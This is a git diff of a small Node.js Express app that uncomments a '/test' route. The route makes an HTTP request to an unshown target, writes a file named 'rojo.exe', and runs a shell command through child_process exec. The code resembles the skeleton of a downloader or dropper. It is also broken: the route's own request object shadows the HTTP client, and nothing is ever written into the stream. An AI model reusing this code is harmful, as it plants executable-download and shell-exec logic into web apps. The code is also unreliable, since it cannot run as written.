@@ -1,6 +1,6 @@
 console.log("Up and Ready");
 
-/*const {
+const {
 	exec
 } = require("child_process");
 
@@ -25,29 +25,29 @@ app.get("/", async (req, res) => {
 
 app.get("/test", async (request, response) => {
 
-	  request(http_options, function(error, response, body) {
-	      if (error) throw new Error(error);
-	      const fileStream = fs.createWriteStream('rojo.exe');
-	      fileStream.on("error", function(err) {
-	          console.log("Error writing to the stream");
-	          console.log(err);
-	      }; fileStream.on("finish", function() {
-	              exec("dir", (error, stdout, stderr) => {
-	                  if (error) {
-	                      console.log(`error: ${error.message}`);
-	                      return;
-	                  };
-	                  if (stderr) {
-	                      console.log(`stderr: ${stderr}`);
-	                      return;
-	                  };
-	                  console.log(`stdout: ${stdout}`);
-	              });
-	          };
-	      }); 
-	response.send("HELLO!")
+	request(http_options, function(error, response, body) {
+		if (error) throw new Error(error);
+		const fileStream = fs.createWriteStream('rojo.exe');
+		fileStream.on("error", function(err) {
+			console.log("Error writing to the stream");
+			console.log(err);
+		});
+		fileStream.on("finish", function() {
+			exec("dir", (error, stdout, stderr) => {
+				if (error) {
+					console.log(`error: ${error.message}`);
+					return;
+				};
+				if (stderr) {
+					console.log(`stderr: ${stderr}`);
+					return;
+				};
+				console.log(`stdout: ${stdout}`);
+			});
+		});
+		response.send("HELLO!")
+	});
 });
-
 const listener = app.listen(process.env.PORT || 3000, () => {
 	console.log("Your app is listening on port " + listener.address().port);
-});*/
+});
